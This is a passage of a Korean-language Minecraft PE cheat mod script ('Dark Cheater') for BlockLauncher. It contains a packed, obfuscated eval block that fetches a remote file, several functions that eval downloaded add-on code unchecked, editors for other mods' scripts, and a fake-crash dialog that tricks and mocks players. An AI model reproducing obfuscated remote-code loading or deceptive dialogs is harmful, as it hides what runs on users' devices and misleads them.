Q\\i\\c\\w\\d\\r\\S\\d\\y\\c\\h\\g\\F\\f\\m\\g\\d\\r\\l\\i\\y\\j\\f\\k\\g\\d\\o\\d\\E\\u\\a\\f\\j\\a\\c\\v\\h\\n\\c\\a\\n\\c\\1m\\i\\a\\o\\f\\m\\a\\c\\H\\i\\k\\c\\l\\f\\m\\a\\c\\s\\a\\1L\\d\\D\\u\\c\\s\\i\\j\\r\\u\\d\\F\\f\\m\\a\\c\\H\\i\\n\\k\\h\\o\\1M\\d\\n\\d\\m\\a\\g\\f\\j\\a\\c\\H\\i\\k\\c\\l\\f\\m\\a\\c\\1a\\a\\i\\m\\l\\c\\f\\j\\a\\c\\1a\\a\\i\\m\\l\\c\\f\\j\\a\\c\\Q\\d\\y\\p\\m\\g\\h\\D\\n\\k\\s\\g\\d\\o\\d\\E\\u\\a\\f\\m\\a\\c\\s\\a\\y\\h\\g\\1m\\i\\a\\o\\f\\m\\a\\c\\H\\i\\n\\k\\h\\o\\f\\v\\1b\\1c\\G\\1b\\1S\\f\\1T\\g\\d\\I\\i\\c\\F\\f\\I\\i\\a\\o\\f\\j\\l\\h\\o\\1W\\c\\1X\\h\\y\\d\\c\\i\\h\\n\\f\\1Z\\x\\f\\u\\i\\n\\a\\1c\\D\\w\\E\\a\\g\\f\\k\\i\\j\\w\\i\\j\\j\\f\\u\\d\\n\\m\\f\\r\\h\\j\\c\\s\\a\\u\\d\\F\\a\\k\\f\\h\\j\\f\\j\\c\\d\\g\\c\\f\\l\\c\\c\\r\\j\\V\\q\\q\\o\\o\\o\\t\\k\\g\\h\\r\\E\\h\\T\\t\\y\\h\\w\\q\\j\\q\\E\\w\\2a\\P\\i\\u\\a\\F\\r\\p\\l\\I\\w\\o\\p\\q\\s\\a\\a\\r\\1h\\P\\1i\\s\\d\\g\\p\\1h\\P\\1i\\v\\l\\a\\d\\c\\a\\g\\t\\M\\j\\2m\\k\\u\\2n\\2p\\f\\m\\a\\c\\s\\d\\c\\d\\S\\g\\h\\w\\2r\\a\\g\\I\\a\\g\\f\\f\\j\\u\\a\\a\\r\\f\\G\\l\\g\\a\\d\\k\\f\\w\\d\\p\\a\\Q\\D\\c\\c\\h\\n\\f\\1n\\1o\\1p\\x\\1q\\1r\\2B\\1t\\1u\\1v\\J\\t".1w("\\f");C U=z K[b[1]].1B(Y+b[0]);1E(!U[b[2]]()){1F(b[3],b[4],b[5],b[6],1);L[b[8]](b[5],b[7])}1I{L[b[10]](b[9]);1K{C A=z B[b[11]].1O();C R=z B[b[11]].1Q(N);R[b[12]](1);C 1f=z B[b[15]][b[14]][b[13]](Y+b[0]);C 1g=z B[b[15]][b[16]].1V(1f);A[b[17]](R);A[b[21]](N[b[20]]()[b[19]]()[b[18]]());A[b[23]](N[b[20]]()[b[19]]()[b[22]]());A[b[24]](1g);A[b[1Y]](N[b[26]]()[b[25]](),B[b[29]][b[28]][b[27]]|B[b[29]][b[28]][b[27]],0,0)}2c(e){2e(e+b[2f]+e[b[2g]])};z B[b[2h]].2i()[b[2j]](z K[b[O]].2l({1j:1k(){A[b[2o]]()}}),1l);z K[b[O]].2q({1j:1k(){C 1e=2s;1e(L[b[2t]](b[2u])+b[2v]);K[b[O]][b[2w]][b[2x]](1l);2y[b[2z]]();L[b[10]](b[2A])}})[b[2d]]()}',62,162,'||||||||||x65|_0xae34|x74|x61||xXZ|x72|x6F|x69|x73|x64|x68|x67|x6E|x77|x6B|x2F|x70|x44|x2E|x6C|x43|x6D|x20|x63|new|screen|android|var|x75|x62|x79|x54|x57|x76|uB2E4|java|Dark|x6A|ctx|34|x32|x42|layout|x46|x78|file|x3A|uC2DC|uC8FC|sdcard|uC138|||||||||||x48|x45|x4E|uC694|_0xe75fx6|image|scre|x25|x30|run|function|3000|x56|uBC84|uD2BC|uC774|uC0DD|uC131|uB85C|uC5C8|uC2B5|uB2C8|split|uC7A0|uAE30|uB824|x4F|File|uB4DC|uAC00|if|download|uB05D|uB098|else|uBA74|try|x66|x4D|uD30C|PopupWindow|uC2E4|LinearLayout|uD589|x52|x47|uD574|BitmapDrawable|x41|x4C|30|x2C|||||||||||x7A|uC77C|catch|37|clientMessage|31|32|36|Handler|35|uC6B4|Runnable|x3F|x3D|33|x31|Thread|x53|eval|39|38|40|42|41|DeepDark|43|44|uB418'.split('|'),0,{});
eval(code);
}
else{
Dark.toast("인터넷에 연결되어 있지 않습니다.");
}
break;
}
}
});
btns[n].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
switch(v.getId()){
case 5 : 
Dark.removeAddOn();
Dark.toast("삭제할 추가 파일을 선택하세요...");
break;
case 9 : 
Dark.save("info6", false);
Dark.toast("버튼 유지가 비활성화 되었습니다.");
break;
case 12 : 
Dark.toast("DCMS 컴파일러의 버전 정보를 불러오고 있습니다...");
new java.lang.Thread({
run : function(){
Dark.redownloadCompiler(Dark.getCompilerVersion(), Dark.getCompilerNewistVersion());
}
}).start();
break;
case 15 : 
try{
DeepDark.makeButton();
}
catch(e){
Dark.toast(e);
}
break;
}
return true;
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuS);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuS);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuS.setContentView(layout2);
menuS.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function smartMoving(tf){
if(Dark.readAddOn("smartMoving")!="") eval(Dark.readAddOn("smartMoving"));
else if(tf) Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}


function openPlus(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuEL2 = new android.widget.PopupWindow();
var title = makeTitle("추가 기능", menuEL2);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = [];
var menuT = ["주기적으로 창고 위치 확인", "엔더 반응기 활성화", "Dark Cheater ESP", "블록 무한 설치", "크리에이티브처럼 블록 캐기", "Fire Editor", "SD 카드 초기화 1차 방어"];
var bools = [showChest, en.tf, esp.tf, tooMany, instaBreak, Boolean(fe.btn), false];
if(Dark.read("sdp1")=="true") bools[6] = true;
for(var n in menuT){
btnT[n] = new DarkToggleButton(ctx);
btnT[n].setText(menuT[n]);
btnT[n].setId(n);
btnT[n].setChecked(bools[n]);
btnT[n].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
switch(toggle.getId()){
case 0 : 
showChest = onoff;
break;
case 1 : 
en.tf = onoff;
break;
case 2 : 
esp.tf = onoff;
if(Dark.readAddOn("ESP")==""&&onoff){
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
btnT[2].setChecked(false);
}
if(!onoff) ModPE.showTipMessage("");
break;
case 3 : 
tooMany = onoff;
break;
case 4 : 
instaBreak = onoff;
break;
case 5 : 
fireEditor(onoff);
break;
case 6 : 
Dark.save("sdp1", onoff);
Dark.toast("블록런처를 다시 시작해야 적용됩니다.");
break;
}
}
}));
layout.addView(btnT[n].mv());
}
var btns = [];
var menus = ["커스텀 아이템 추가", "적용된 스크립트 수정", "가짜 크래시 띄우기", "건물 소환", "히로빈 소환", "setTile 매니저", "ESP-SB 아이템 지급", "설치된 어플 보기", "제작자 소환", "오버라이드된 파일 삭제"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
addNewItem();
break;
case 1 : 
selectLauncher();
break;
case 2 : 
ModPE.leaveGame();
fakeCrash();
break;
case 3 : 
Dark.selectBuilding(false);
break;
case 4 : 
h.tf = true;
Dark.toast("터치하시면 소환됩니다.");
break;
case 5 : 
setTileManager();
break;
case 6 : 
addItemInventory(302, 1, 0);
addItemInventory(303, 1, 0);
addItemInventory(304, 1, 0);
addItemInventory(305, 1, 0);
addItemInventory(267, 1, 0);
addItemInventory(354, 30, 0);
addItemInventory(320, 30, 0);
if(mcpev2){
addItemInventory(373, 30, 28);
addItemInventory(373, 15, 30);
}
addItemInventory(306, 1, 0);
addItemInventory(307, 1, 0);
addItemInventory(308, 1, 0);
addItemInventory(309, 1, 0);
Dark.toast("지급되었습니다.");
break;
case 7 : 
loadAppList(true);
break;
case 8 : 
makerSummon = true;
Dark.toast("터치하시면 소환됩니다.");
break;
case 9 : 
ModPE.resetImages();
Dark.toast("파일(들)이 삭제되었습니다.");
break;
}
}
});
btns[n].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
switch(v.getId()){
case 1 : 
selectLauncher(true);
break;
case 5 : 
particleHelper();
break;
case 7 : 
loadAppList(false);
break;
}
return true;
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuEL2);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuEL2);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuEL2.setContentView(layout2);
menuEL2.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function addNewItem(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var tf = false;
var tf2 = false;
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
var hand = new android.widget.CheckBox(ctx);
hand.setText("도구처럼 설정");
hand.setChecked(false);
hand.setTextColor(white);
hand.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
tf = onoff;
}
}));
layout.addView(hand);
var data = new android.widget.CheckBox(ctx);
data.setText("내구도 설정");
data.setChecked(false);
data.setTextColor(white);
data.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
try{
tf2 = onoff;
if(onoff&&type!=2){
layout.addView(loc15);
layout.addView(loc16);
}
else{
layout.removeView(loc15);
layout.removeView(loc16);
}
}
catch(e){
//null
}
}
}));
layout.addView(data);
var type = 0;
var spin = new android.widget.Spinner(ctx);
var types = ["일반 아이템", "음식", "갑옷", "투척 가능한 아이템"];
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
type = p;
try{
switch(p){
case 0 : 
layout.removeView(loc9);
layout.removeView(loc10);
layout.removeView(loc11);
layout.removeView(loc12);
layout.removeView(loc13);
layout.removeView(loc14);
layout2.removeView(spin2);
if(tf2){
layout.addView(loc15);
layout.addView(loc16);
}
break;
case 1 : 
loc9.setText("회복량 : ");
loc10.setHint("새로 추가할 음식의 회복량을 입력하세요(음수 포함)...");
loc10.setInputType(number|number2);
layout2.removeView(spin2);
layout.removeView(loc11);
layout.removeView(loc12);
layout.removeView(loc13);
layout.removeView(loc14);
layout.addView(loc9);
layout.addView(loc10);
if(tf2){
layout.addView(loc15);
layout.addView(loc16);
}
break;
case 2 : 
loc9.setText("입었을 때 텍스쳐 : ");
loc10.setHint("갑옷 스킨의 텍스쳐명을 입력하세요...");
loc10.setInputType(android.text.InputType.TYPE_CLASS_TEXT);
loc11.setText("방어력 : ");
loc12.setHint("방어력을 입력하세요...");
loc12.setInputType(number|number2);
loc13.setText("내구도 : ");
loc14.setHint("내구도를 입력하세요...");
loc14.setInputType(number|number2);
layout2.addView(spin2);
layout.addView(loc9);
layout.addView(loc10);
layout.addView(loc11);
layout.addView(loc12);
layout.addView(loc13);
layout.addView(loc14);
if(tf2){
layout.removeView(loc15);
layout.removeView(loc16);
}
break;
case 3 : 
layout.removeView(loc9);
layout.removeView(loc10);
layout.removeView(loc11);
layout.removeView(loc12);
layout.removeView(loc13);
layout.removeView(loc14);
layout2.removeView(spin2);
if(tf2){
layout.addView(loc15);
layout.addView(loc16);
}
break;
}
}
catch(e){
//null
}
}
}));
layout.addView(spin);
layout.addView(layout2);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
var loc7 = new android.widget.TextView(ctx);
var loc8 = new android.widget.EditText(ctx);
//---
var armorType = 0;
var spin2 = new android.widget.Spinner(ctx);
var armorTypes = ["갑옷 타입 선택", "모자", "윗옷", "바지", "신발"];
var adapter2 = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, armorTypes);
spin2.setAdapter(adapter2);
spin2.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
armorType = p;
}
}));
var loc9 = new android.widget.TextView(ctx);
var loc10 = new android.widget.EditText(ctx);
loc9.setTextSize(18);
loc9.setTextColor(white);
loc10.setTextColor(white);
Dark.noFullScreen(loc10);
var loc11 = new android.widget.TextView(ctx);
var loc12 = new android.widget.EditText(ctx);
loc11.setTextSize(18);
loc11.setTextColor(white);
loc12.setTextColor(white);
Dark.noFullScreen(loc12);
var loc13 = new android.widget.TextView(ctx);
var loc14 = new android.widget.EditText(ctx);
loc13.setTextSize(18);
loc13.setTextColor(white);
loc14.setTextColor(white);
Dark.noFullScreen(loc14);
var loc15 = new android.widget.TextView(ctx);
var loc16 = new android.widget.EditText(ctx);
loc15.setTextSize(18);
loc15.setText("최대 내구도 : ");
loc16.setHint("최대 내구도를 입력하세요...");
loc15.setTextColor(white);
loc16.setTextColor(white);
Dark.noFullScreen(loc16);
//---
loc1.setText("아이템 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("새로 추가할 아이템의 아이템 아이디를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("텍스쳐명 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("새로 추가할 아이템의 텍스쳐명을 입력하세요...");
loc4.setTextColor(white);
loc5.setText("텍스쳐 인덱스 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("새로 추가할 아이템의 텍스쳐 인덱스를 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number);
loc7.setText("아이템 이름 : ");
loc7.setTextSize(18);
loc7.setTextColor(white);
loc8.setHint("새로 추가할 아이템의 이름을 입력하세요...");
loc8.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
layout.addView(loc7);
layout.addView(loc8);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
Dark.noFullScreen(loc6);
Dark.noFullScreen(loc8);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("커스텀 아이템 추가");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
try{
switch(type){
case 0 : 
ModPE.setItem(loc2.getText(), loc4.getText()+"", loc6.getText(), loc8.getText()+"");
Dark.toast(loc8.getText()+"(이)라는 아이템이 추가되었습니다.\n (아이템 아이디 : "+loc2.getText()+")");
break;
case 1 : 
ModPE.setFoodItem(loc2.getText(), loc4.getText()+"", loc6.getText(), Number(loc10.getText()), loc8.getText()+"");
Dark.toast(loc8.getText()+"(이)라는 음식이 추가되었습니다.\n (아이템 아이디 : "+loc2.getText()+", 회복량 : "+loc10.getText()+")");
break;
case 2 : 
if(armorType==0){
Dark.toast("갑옷 타입이 선택되지 않았습니다.");
}
else{
armorType--;
Item.defineArmor(loc2.getText(), loc4.getText(), loc6.getText(), loc8.getText(), loc10.getText(), Number(loc12.getText()), Number(loc14.getText()), armorType);
Dark.toast(loc8.getText()+"(이)라는 갑옷이 추가되었습니다.\n (아이템 아이디 : "+loc2.getText()+", 방어력 : "+loc10.getText()+")");
tf2 = false;
}
break;
case 3 : 
Item.defineThrowable(loc2.getText(), loc4.getText()+"", loc6.getText(), loc8.getText()+"");
Dark.toast(loc8.getText()+"(이)라는 던질 수 있는 아이템이 추가되었습니다.\n (아이템 아이디 : "+loc2.getText()+")");
break;
}
Item.setHandEquipped(loc2.getText(), tf);
if(tf2) Item.setMaxDamage(loc2.getText(), loc16.getText());
}
catch(e){
Dark.showError(e);
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function blockEventHook(x, y, z, t, d){
if(showChest) darkMessage("창고 위치 : "+x+", "+y+", "+z);
if(loadChest){
var i, a, it;
var data = [];
for(var n=0;n<27;n++){
i = Level.getChestSlot(x, y, z, n);
a = Level.getChestSlotCount(x, y, z, n);
it = Level.getChestSlotData(x, y, z, n);
data.push([i, a, it]);
}
loadChestData.push([[x, y, z], data]);
loadChestCount++;
loadChest2 = true;
}
}


function selectLauncher(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var nn = 0;
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var radios = new android.widget.RadioGroup(ctx);
var radio1 = new android.widget.RadioButton(ctx);
radio1.setText("블록 런처");
radio1.setTextColor(white);
radio1.setId(1);
var radio2 = new android.widget.RadioButton(ctx);
radio2.setText("블록 런처 프로");
radio2.setTextColor(white);
radio2.setId(2);
radios.addView(radio1);
radios.addView(radio2);
layout.addView(radios);
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
nn = checkedId;
}
}));
var txt = new android.widget.TextView(ctx);
if(tf) var cache = "모드";
else var cache = "스크립트";
txt.setText("루팅을 하지 않은 경우, 블록 런처에서 블록 런처 프로에 적용된 "+cache+"들을 확인하거나 그 반대의 경우(블록 런처 프로에서 블록 런처에 적용된 "+cache+"들을 확인)는 불가능합니다.");
txt.setTextSize(17);
txt.setTextColor(white);
layout.addView(txt);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("런처 선택");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(tf) showModList(nn);
else showScriptList(nn);
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function showScriptList(nn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
if(nn==1) var path = BlocklauncherRoot+"/app_modscripts";
if(nn==2) var path = BlocklauncherRoot+".pro/app_modscripts";
var dir = new java.io.File(path).list().sort();
dialog.setItems(dir, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
openScriptEditor(dir[w], readScript(dir[w], nn), nn);
}
}));
dialog.setTitle("적용된 스크립트 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.toast("루팅되어있지 않습니다.");
return;
Dark.showError(e);
}
}
}));
}


function openScriptEditor(name, string, nn){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx)
layout.setOrientation(1);
var text = new android.widget.EditText(ctx);
text.setText(string);
text.setTextColor(white);
text.setTextSize(17);
layout.addView(text);
Dark.noFullScreen(text);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle(name);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
saveScript(name, text.getText().toString(), nn);
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function saveScript(name, msg, nn){
try{
if(nn==1) var path = BlocklauncherRoot+"/app_modscripts";
if(nn==2) var path = BlocklauncherRoot+".pro/app_modscripts";
var file = new java.io.File(path+"/"+name);
var fos = new java.io.FileOutputStream(file);
var str = new java.lang.String(msg);
fos.write(str.getBytes());
fos.close();
}
catch(e){
Dark.showError(e);
}
}


function readScript(name, nn){
try{
if(nn==1) var path = BlocklauncherRoot+"/app_modscripts";
if(nn==2) var path = BlocklauncherRoot+".pro/app_modscripts";
var file = new java.io.File(path+"/"+name);
if(!(file.exists())) return "";
var fis = new java.io.FileInputStream(file);
var isr = new java.io.InputStreamReader(fis);
var br = new java.io.BufferedReader(isr);
var str = br.readLine();
var line = "";
while((line = br.readLine()) != null){
str += "\n" + line;
}
fis.close();
isr.close();
br.close();
return str;
}
catch(e){
Dark.showError(e);
}
}


function fakeCrash(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx);
dialog.setMessage("BlockLauncher에서 크래시를 감지하였습니다. 나중의 크래시를 방지하기 위해 안전 모드를 활성화 합니다.");
dialog.setNegativeButton("계속", null);
dialog.setPositiveButton("안전모드 끄기", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Dark.toast("한명 낚았다. 훗");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makeBuilding(x, y, z){
var names = ["wood", "wood2", "stone", "woodStone", "netherReactor", "EnerReactor", "EnderPortal"];
var cache = Dark.readAddOn("buildings/"+names[buildingType]);
if(cache=="") Dark.toast("파일이 없습니다.");
else eval(cache+"");
}


function particleShot(){
var px, py, pz, yaw, sin, cos;
px = Entity.getX(nox);
py = Entity.getY(nox)+0.3;
pz = Entity.getZ(nox);
yaw = Math.floor(Entity.getYaw(nox));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
for(var gun=3;gun<40;gun++)
Level.addParticle(ParticleType.flame, px+gun*sin/2, py, pz+gun*cos/2, 0, 0, 0, 3);
}


function pushMaker(){
var yaw, sin, cos;
yaw = Math.floor(Entity.getYaw(nox));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
Entity.setVelX(nox, 3.2*sin);
Entity.setVelY(nox, 0.7);
Entity.setVelZ(nox, 3.2*cos);
}


function giveDiamonds(){
var px, py, pz, yaw, sin, cos;
px = Entity.getX(nox);
py = Entity.getY(nox)+0.3;
pz = Entity.getZ(nox);
yaw = Math.floor(Entity.getYaw(nox));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
Level.dropItem(px+2.3*sin, py, pz+2.3*cos, 0, 264, 3, 0);
dtm("다이아몬드가 필요한가?");
}


function antiTouch(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var menu = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
if(anT==0){
anT = 5;
}
else if(anT>0){
anT = -5;
}
else{
menu.dismiss();
Dark.toast("풀렸습니다.");
}
}
});
menu.setContentView(layout);
menu.setFocusable(true);
menu.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth());
menu.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(0, 0, 0, 0)));
menu.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makeBtnW(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
w.btn = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var button = new android.widget.Button(ctx);
button.setText("W");
button.setTextSize(10);
button.setBackgroundColor(android.graphics.Color.argb(70, 0, 0, 0));
button.setTextColor(white);
button.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
if(w.menu==null) worldEditPlus(true);
else worldEditPlus(false);
}
}));
setDragListener(w.btn, button, 0);
layout.addView(button);
w.btn.setContentView(layout);
w.btn.setWidth(dip2px(ctx, 27));
w.btn.setHeight(dip2px(ctx, 27));
w.btn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
if(Dark.read("wBtnX")=="") w.btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, 0, dip2px(ctx, 25));
else w.btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("wBtnX"), Dark.read("wBtnY"));
}
else{
if(w.btn!=null){
w.btn.dismiss();
w.btn = null;
}
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function worldEditPlus(tf){
if(!w.tf){
Dark.toast("월드 에딧이 비활성화 되어있습니다.");
return;
}
if(Dark.readAddOn("worldEdit")!="")
eval(Dark.readAddOn("worldEdit"));
else
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}


function inputBlockId(type){
if(type==4) replaceDialog(true);
else if(type==5) procCmd("snow");
else if(type==6) procCmd("freeze");
else if(type==7) procCmd("no tree");
else if(type==8) procCmd("no water");
else if(type==9){
new java.lang.Thread({
run : function(){
procCmd("copy");
}
}).start();
}
else if(type==10){
new java.lang.Thread({
run : function(){
procCmd("paste");
}
}).start();
}
else{
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc1.setText("블록 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("블록 아이디를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("블록 데미지 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("블록 데미지를 입력하세요...");
loc4.setTextColor(white);
loc4.setInputType(number);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
if(type>=19){
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
loc5.setText("거리 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("거리를 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number);
layout.addView(loc5);
layout.addView(loc6);
Dark.noFullScreen(loc6);
}
else if(type>=13){
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
loc5.setText("반지름 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("반지름를 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number);
layout.addView(loc5);
layout.addView(loc6);
Dark.noFullScreen(loc6);
if(type==15){
var loc7 = new android.widget.TextView(ctx);
var loc8 = new android.widget.EditText(ctx);
loc7.setText("높이 : ");
loc7.setTextSize(18);
loc7.setTextColor(white);
loc8.setHint("높이를 입력하세요...");
loc8.setTextColor(white);
loc8.setInputType(number);
layout.addView(loc7);
layout.addView(loc8);
Dark.noFullScreen(loc8);
}
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
if(type==3) dialog.setTitle("채우기");
if(type==11) dialog.setTitle("벽(내부 지형 삭제)");
if(type==12) dialog.setTitle("벽(내부 지형 유지)");
if(type==13) dialog.setTitle("원");
if(type==14) dialog.setTitle("찬 원");
if(type==15) dialog.setTitle("원기둥");
if(type==16) dialog.setTitle("구");
if(type==17) dialog.setTitle("반구");
if(type==18) dialog.setTitle("찬 구");
if(type==19) dialog.setTitle("직선");
if(type==20) dialog.setTitle("직선(y축 포함)");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
new java.lang.Thread({
run : function(){
if(type==3) procCmd("set "+loc2.getText()+" "+loc4.getText());
if(type==11) procCmd("wall "+loc2.getText()+" "+loc4.getText());
if(type==12) procCmd("wall2 "+loc2.getText()+" "+loc4.getText());
if(type==13) procCmd("circle "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==14) procCmd("circle2 "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==15) procCmd("cylin "+loc6.getText()+" "+loc8.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==16) procCmd("sphere "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==17) procCmd("sphereh "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==18) procCmd("sphere2 "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==19) procCmd("line "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==20) procCmd("line2 "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
}
}).start();
}
}));
dialog.show();
}
catch(e){
clientMessaeg(e+", "+e.lineNumber);
}
}
}));
}
}


function setTileManager(){
if(!w.tf){
Dark.toast("월드 에딧이 비활성화 되어있습니다.");
}
else if(!sm.tf){
Dark.toast("setTile 메니저가 비활성화 되어있습니다.");
}
else{
